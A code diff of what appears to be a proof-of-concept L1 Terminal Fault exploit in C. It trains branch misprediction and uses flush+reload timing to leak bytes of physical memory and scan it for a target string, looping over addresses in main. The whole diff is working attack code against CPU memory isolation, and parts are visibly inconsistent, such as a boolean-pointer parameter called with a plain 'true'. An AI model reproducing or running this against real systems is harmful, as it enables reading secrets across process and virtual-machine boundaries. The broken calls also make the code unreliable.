@@ -27,14 +27,14 @@
 static void segfault_handler_nibbles(int sig, siginfo_t *info, void *ucontext) {
   ucontext_t *uc = (ucontext_t *)ucontext;
   greg_t *rip = &uc->uc_mcontext.gregs[REG_RIP];
-  // *rip = (uint64_t)&reload_label_nibbles;
+  *rip = (uint64_t)&reload_label_nibbles;
 }
-
-static void segfault_handler_full(int sig, siginfo_t *info, void *ucontext) {
-  ucontext_t *uc = (ucontext_t *)ucontext;
-  greg_t *rip = &uc->uc_mcontext.gregs[REG_RIP];
-  *rip = (uint64_t)&reload_label_full;
-}
+//
+// static void segfault_handler_full(int sig, siginfo_t *info, void *ucontext) {
+//   ucontext_t *uc = (ucontext_t *)ucontext;
+//   greg_t *rip = &uc->uc_mcontext.gregs[REG_RIP];
+//   *rip = (uint64_t)&reload_label_full;
+// }
 #pragma GCC diagnostic pop
 
 uint8_t reconstruct_nibbles(size_t raw_results[AMOUNT_OF_RELOAD_PAGES]) {
@@ -48,19 +48,35 @@ uint8_t reconstruct_nibbles(size_t raw_results[AMOUNT_OF_RELOAD_PAGES]) {
   return result;
 }
 
-uint8_t l1tf_full(void *leak_addr, reload_buffer_t reload_buffer) {
-  size_t raw_results[AMOUNT_OF_RELOAD_PAGES] = {0};
+void l1tf_full_mispredict(void *leak_addr, reload_buffer_t reload_buffer,
+                          bool *do_l1tf) {
+  volatile int dummy = 0;
+  for (int i = 0; i < 123; ++i) {
+    for (int j = 0; j < 67; ++j) {
+      dummy += i - j;
+    }
+  }
 
-  flush(AMOUNT_OF_RELOAD_PAGES, PAGE_SIZE, (void *)reload_buffer);
-
-  // Flush the address of the segfault handler to increase
-  // the length of the speculative window (hopefully?)
-  clflush((void *)segfault_handler_nibbles);
+  clflush(do_l1tf);
   mfence();
 
-  ret2spec(leak_addr, reload_buffer[0], reload_buffer[1]);
-  // asm_l1tf_leak_nibbles(leak_addr, reload_buffer);
+  if (*do_l1tf) {
+    dummy = *reload_buffer[1][0x1];
+    asm_l1tf_leak_nibbles(leak_addr, reload_buffer);
+    dummy = *reload_buffer[0][0x2];
+  }
+}
 
+uint8_t l1tf_full(void *leak_addr, reload_buffer_t reload_buffer,
+                  bool do_l1tf) {
+  size_t raw_results[AMOUNT_OF_RELOAD_PAGES] = {0};
+
+  for (int i = 0; i < 20; ++i) {
+    l1tf_full_mispredict(leak_addr, reload_buffer, true);
+  }
+
+  flush(AMOUNT_OF_RELOAD_PAGES, PAGE_SIZE, (void *)reload_buffer);
+  l1tf_full_mispredict(leak_addr, reload_buffer, &do_l1tf);
   reload(AMOUNT_OF_RELOAD_PAGES, PAGE_SIZE, (void *)reload_buffer, raw_results,
          THRESHOLD);
 
@@ -74,7 +90,7 @@ uint8_t l1tf_full(void *leak_addr, reload_buffer_t reload_buffer) {
 bool l1tf_check(void *leak_addr, full_reload_buffer_t reload_buffer,
                 uint8_t check) {
   clflush(reload_buffer[check]);
-  clflush((void *)segfault_handler_full);
+  // clflush((void *)segfault_handler_full);
   mfence();
 
   asm_l1tf_leak_full(leak_addr, reload_buffer);
@@ -91,8 +107,8 @@ void *l1tf_scan_physical_memory(size_t length, char needle[length],
   leak_addr_t leak = l1tf_leak_buffer_create();
 
   struct sigaction sa = {0};
-  sa.sa_handler = (void *)segfault_handler_full;
-  sigaction(SIGSEGV, &sa, NULL);
+  // sa.sa_handler = (void *)segfault_handler_full;
+  // sigaction(SIGSEGV, &sa, NULL);
 
   // First, scan quickly
   full_reload_buffer_t reload_buffer;
@@ -167,8 +183,10 @@ int main(int argc, char *argv[argc]) {
   assert(tail != argv[1]);
 
   tail = NULL;
-  size_t length = strtoull(argv[2], &tail, 10);
+  size_t do_it = strtoull(argv[2], &tail, 10);
   assert(tail != argv[2]);
+
+  size_t length = 32;
 
   fprintf(stderr, "Attempting to leak %ld bytes from %p...\n", length,
           (void *)phys_addr);
@@ -201,7 +219,7 @@ int main(int argc, char *argv[argc]) {
   while (1) {
     for (size_t j = start; j < start + length; j += 1) {
       void *leak_addr = (char *)leak.leak + j;
-      uint8_t leaked_byte = l1tf_full(leak_addr, *reload_buffer);
+      uint8_t leaked_byte = l1tf_full(leak_addr, *reload_buffer, do_it);
 
       if (leaked_byte != 0) {
         results[j - start] = leaked_byte;
